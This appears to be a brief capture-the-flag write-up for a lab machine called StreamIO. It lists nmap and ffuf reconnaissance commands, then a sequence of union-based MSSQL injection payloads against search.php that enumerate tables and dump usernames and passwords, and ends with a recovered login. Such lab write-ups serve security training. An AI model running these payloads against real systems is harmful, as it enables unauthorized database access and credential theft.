SQL Injection






nmap -sS -sC -sV -T5 -Pn 10.10.11.158
![image](https://user-images.githubusercontent.com/33616880/231678963-7c74a0a4-d0d6-4c7a-9dd6-15fa0a3a0f90.png)



https://watch.streamio.htb/
![image](https://user-images.githubusercontent.com/33616880/231679081-ce827ae4-c21b-4073-b1d1-8d9f7ef87bb8.png)



ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html![image](https://user-images.githubusercontent.com/33616880/231679110-329c5d3d-31d3-47c3-a82c-60f431c2b08a.png)



https://watch.streamio.htb/search.php
![image](https://user-images.githubusercontent.com/33616880/231679168-05ee4b46-32aa-44b9-9dc0-acdac11c53bb.png)


```
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6 -- -
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```


![image](https://user-images.githubusercontent.com/33616880/231682312-5800f445-3c89-4aa3-8110-5de64c805117.png)
![image](https://user-images.githubusercontent.com/33616880/231682585-e0902d6b-7ac8-41c8-8a42-b7cd78fe1776.png)
![image](https://user-images.githubusercontent.com/33616880/231682816-1f5bd069-b658-41e1-8355-afecd16ba1b8.png)
![image](https://user-images.githubusercontent.com/33616880/231683062-e55c2a7f-0633-4bf9-b7d1-d1d76e48ba57.png)
![image](https://user-images.githubusercontent.com/33616880/231683260-9e522f56-bdb3-407f-86c4-7b7087301533.png)
![image](https://user-images.githubusercontent.com/33616880/231683518-ed431e05-ff5f-4803-811e-690220fd83e0.png)



![image](https://user-images.githubusercontent.com/33616880/231683958-c70902d2-5b01-42f5-8ff4-391b6e1921de.png)



https://streamio.htb/login.php
![image](https://user-images.githubusercontent.com/33616880/231684123-97a34f6f-ee6a-4801-9bff-0df23c33adbf.png)


yoshihide | 66boysandgirls..
![image](https://user-images.githubusercontent.com/33616880/231684191-deebb280-68bc-4a64-925e-27d2ae57c876.png)
